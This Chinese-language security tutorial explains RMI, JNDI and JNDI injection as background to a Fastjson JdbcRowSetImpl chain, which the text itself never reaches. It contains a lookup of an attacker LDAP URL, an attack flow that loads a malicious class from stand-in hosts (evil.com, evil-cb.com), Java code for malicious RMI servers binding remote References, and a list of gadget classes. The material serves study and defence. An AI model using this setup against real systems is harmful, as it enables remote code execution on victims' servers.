# Fastjson jdbcRowSetImpl链及后续漏洞分析
在jdbcRowSetImpl中会用到jndi和rmi的知识
具体请见：
素十八大佬对RMI流程的源码进行了深入分析：
本文源码分析均可跳过
## RMI
​
拥有远程方法的类必须实现Remote接口，且该类必须继承UnicastRemoteObject类。如果不继承UnicastRemoteObject类，可以调用UnicastRemoteObject.exportObject()手工初始化，比如：
    public class HelloImpl implements IHello {
        protected HelloImpl() throws RemoteException {
            UnicastRemoteObject.exportObject(this, 0);
        }
        @Override
        public String sayHello(String name) {
            System.out.println(name);
            return name;
        }
    }
其中 继承了Remote类的IHello接口 是客户端和服务端共用的接口。因为客户端指定调用的远程方法，它的全限定名必须和服务器上的完全相同
  * RMI通信过程：
其中存根stub是客户端的代理，骨架skeleton是服务器代理
  1. 创建远程对象。`ServiceImpl service = new ServiceImpl();`
  2. 注册远程对象。`Naming.bind("rmi:127.0.0.1:1099/service",service);`(service为ServiceImpl定义的远程对象)
  3. 客户端访问服务器并查找远程对象。包括两个步骤：
①用interface定义要查找的远程对象，在第四步作为引用：`ServiceInterface service =
(ServiceInterface);`
②查找远程对象。`Naming.lookup("rmi://127.0.0.1:1099/service")`
  4. Registry返回服务器对象存根。也就是把远程对象service作为自己的service（引用），称为stub
  5. 调用远程方法。比如`String rep = service.cxk("ctrl");`
  6. 客户端存根和服务器骨架通信
  7. 骨架代理调用`service.cxk("ctrl");`，实际上是在Server端调用的
  8. 骨架把结果返回给存根
  9. 存根把结果返回给客户端
其中存根stub在客户端，skeleton是服务端本身的远程对象(service本尊)
注册远程对象一般是：
    IHello rhello = new HelloImpl();
    LocateRegistry.createRegistry(1099);
    Naming.bind("rmi://x.x.x.x:1099/hello",rhello);
然后客户端利用`LocateRegistry.getRegistry()`本地创建Stub作为Registry远程对象的代理。然后利用lookup根据名称查找某个远程对象，来获取该远程对象的Stub：
    Registry registry = LocateRegistry.getRegistry("kingx_kali_host",1099);
    IHello rhello = (IHello) registry.lookup("hello");
    rhello.sayHello("test");
### 动态类加载
在本地找不到类时，会从远程URL去下载。比如服务端返回的对象是一些子类的对象实例，但是客户端上并没有其子类的class文件，如果客户端要用到这些子类中的方法，则需要允许其动态加载其他类的能力。
所以客户端使用了Registry的机制，RMIServer把url传递给客户端，客户端通过HTTP下载类。
## JNDI
JNDI用来定位资源。JNDI每个对象都有唯一的名字与其对应，可以通过名字检索对象
JNDI接口初始化时，可以将RMI URL作为参数，JNDI注入漏洞出现在客户端的lookup()函数。
如下用JNDI进行lookup：
    Hashtable env = new Hashtable();
    env.put(Context.INITIAL_CONTEXT_FACTORY,"com.sun.jndi.rmi.registry.RegistryContextFactory");
    //RegistryContextFactory 是RMI Registry Service Provider对应的Factory
    env.put(Context.PROVIDER_URL, "rmi://www.0kai0.cn:8080");
    Context ctx = new InitialContext(env);
    Object local_obj = ctx.lookup("rmi://www.0kai0.cn:8080/test");
其中InitialContext类作为JNDI命名服务的入口点，该类实现了Context接口。InitialContext构造函数需要为Hashtable或者其子类。初始化时要指定上下文环境，通常是JNDI工厂和JNDI的url和端口。比如这里是RMI服务，就指定RMI的工厂和url
该种初始化方式利用了哈希表，其实也可以直接设置value值：
    System.setProperty(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
            System.setProperty(Context.PROVIDER_URL, "rmi://www.0kai0.cn:8080");
    InitialContext ctx = new InitialContext();
  * JNDI提供的服务：
Java Naming 命名服务。进行命名，也就是键值对的绑定
Java Directory 目录服务。目录服务的对象可以有属性，在目录服务中可以根据属性检索对象
ObjectFactory 对象工厂。将Naming Service（如RMI）中存储的数据转化为Java中可表达的数据。
JNDI注入就是远程下载自定义的ObjectFactory类
在JNDI中提供了bind绑定和lookup检索对象。lookup通过名字进行检索
> RMI绑定的对象和JNDI绑定对象的区别
>
>
> 1.纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口。JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中
>
>
> 2.纯RMI实现中是调用java.rmi包内的lookup()方法来检索。JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索
### Reference类
Reference类表示对存在于Naming/Directory之外的对象引用
对象可以通过Reference存储在Naming或者Directory服务下。有师傅可能会问，javax.naming.InitialContext.bind()不就是绑定对象了吗，但是RMI绑定的对象为本地远程对象（在本地项目文件内），Reference可以远程加载类(file/ftp/http等协议)，并且实例化
> java中的对象分本地对象和远程对象，本地对象默认可信任。远程对象根据安全管理器划分到不同的域，而拥有不同的权限
>
> 不过JNDI有两种安全控制方式，对JNDI SPI层，RMI\LDAP\CORBA的控制方式不同
>
> | 远程加载类权限 | 安全管理器强制实施  
> ---|---|---  
> RMI | java.rmi.server.userCodebaseOnly=false(JDK>7u21=true) | Always  
> LDAP | com.sun.jndi.ldap.object.trustURLCodebase=true(默认flase) | 非强制  
> CORBA |  | always  
### JNDI协议动态转换
有的时候你指定了RMI服务，但是在使用的时候用到LDAP服务的绑定对象。可以直接指定协议，在lookup()、search()会访问LDAP服务的对象而非RMI（那设置工厂有什么意义？其实设置工厂是为了bind()对象到RMI服务，至于search、lookup这种工作不局限于RMI，所以就动态转换了。
    ctx.lookup("ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com");
在lookup()的源码也可以看到，getURLOrDefaultInitCtx()尝试获取对应协议的上下文环境
## JNDI注入
### 利用JNDI References进行注入（RMI）
RMI Server除了可以直接绑定远程对象外（先new后bind），还能通过`References`类来直接绑定外部远程对象。
当绑定在RMI注册表中的Reference，指向恶意远程class文件。并且JNDI客户端lookup()参数可控（或者Reference指定远程类参数可控），能实现RCE
> 攻击原理：
>
>   1. 攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 `rmi://evil.com:1099/refObj`；
>   2. 原先配置好的上下文环境 `rmi://localhost:1099` 会因为动态环境转换而被指向
> `rmi://evil.com:1099/`；
>   3. 应用去 `rmi://evil.com:1099` 请求绑定对象 `refObj`，攻击者事先准备好的 RMI 服务会返回与名称
> `refObj`想绑定的 ReferenceWrapper 对象（`Reference("EvilObject", "EvilObject",
> "[evil-cb.com/](http://evil-cb.com/)")`）；
>   4. 应用获取到 `ReferenceWrapper` 对象开始从本地 `CLASSPATH` 中搜索 `EvilObject`
> 类，如果不存在则会从 `[evil-cb.com/](http://evil-cb.com/)` 上去尝试获取
> `EvilObject.class`，即动态的去获取 `[evil-cb.com/EvilObject.class](http://evil-> cb.com/EvilObject.class)`；
>   5. 攻击者事先准备好的服务返回编译好的包含恶意代码的 `EvilObject.class`；
>   6. 应用开始调用 `EvilObject` 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行；
>
  * 示例：
JNDIClient：
    public class JNDIClient {
        public static void main(String[] args) throws Exception {
            Context ctx = new InitialContext();
            ctx.lookup(rmi://127.0.0.1:1099/refObj);
        }
    }
RMIServer：
RMI绑定的远程对象需要继承UnicastRemoteObject类并实现Remote接口，ReferenceWrapper类就符合条件。用ReferenceWrapper对Reference进行封装。
    public class RMIService {
        public static void main(String args[]) throws Exception {
            Registry registry = LocateRegistry.createRegistry(1099);//Registry写在server里
            Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8080/");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
            registry.bind("refObj", refObjWrapper);
        }
    }
其中Reference构造函数的第一个参数是在本地查找EvilObject类，如果没有，就从`http://127.0.0.1:8080/`搜索第二个参数名的EvilObject类
    Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8080/");
#### 服务端Reference classFactoryLocation可控
在Reference构造函数中的第三个参数，远程加载类的URL地址，称为classFactoryLocation。
    Reference refObj = new Reference("EvilObject", "EvilObject", "http://127.0.0.1:8080/");
因为在服务端，所以这种情况很少见。
如下Server：
    public class BServer {
        public static void main(String args[]) throws Exception {
            String uri = args[0];
            Registry registry = LocateRegistry.createRegistry(1099);
            Reference refObj = new Reference("EvilClass", "EvilClassFactory", uri);
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
            registry.bind("demo", refObjWrapper);
        }
    }
可以看到uri可控，当指向攻击者自己的web服务器，攻击者将EvilClassFactory恶意类放到自己的web服务器下
uri路径。RMI客户端通过JNDI查询绑定的类时，会远程加载恶意类造成命令执行
#### 客户端lookup参数可控
如JNDI客户端lookup()接收外部可控参数：
    public class JNDIClient {
        public static void main(String[] args) throws Exception {
            Properties env = new Properties();
            env.put(Context.INITIAL_CONTEXT_FACTORY,
                    "com.sun.jndi.rmi.registry.RegistryContextFactory");
            env.put(Context.PROVIDER_URL, "rmi://127.0.0.1:1099");
            String uri = args[0];
            Context ctx = new InitialContext(env);
            ctx.lookup(uri);
        }
    }
攻击者可以传入恶意URI地址指向攻击者的RMIRegistry，构造恶意RMIServer，自然也能构造RMI注册表的恶意类。比如攻击者搭建的恶意AServer（图方便注册表和server一起写）
    public class AServer {
        public static void main(String args[]) throws Exception {
            Registry registry = LocateRegistry.createRegistry(1688);
            Reference refObj = new Reference("EvilClass", "EvilClassFactory", "test");
            ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj);
            System.out.println("[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'");
            registry.bind("exp", refObjWrapper);
        }
    }
在服务端写恶意EvilClass，或者URL目录下(test/)写恶意EvilClassFactory都能造成远程代码执行。
此时向lookup传指向恶意Server的参数：rmi://127.0.0.1:1688/exp
**小细节**
：当使用lookup指定rmi服务来搜寻类时，搜寻到的类需要满足远程类的要求：继承UnicastRemoteObject并实现Remote接口
造成该漏洞需要 能实现动态转换uri的InitialContext.lookup()
RMI调用了该函数的类有：
    org.springframework.transaction.jta.JtaTransactionManager.readObject()
    com.sun.rowset.JdbcRowSetImpl.execute()
    javax.management.remote.rmi.RMIConnector.connect()
    org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)
LDAP调用了该函数的类有：
    InitialDirContext.lookup()
    Spring's LdapTemplate.lookup()
    LdapTemplate.lookupContext()
在反序列化漏洞的利用过程中，也可以在readObject寻找可被外部控制的lookup()方法，来触发反序列化漏洞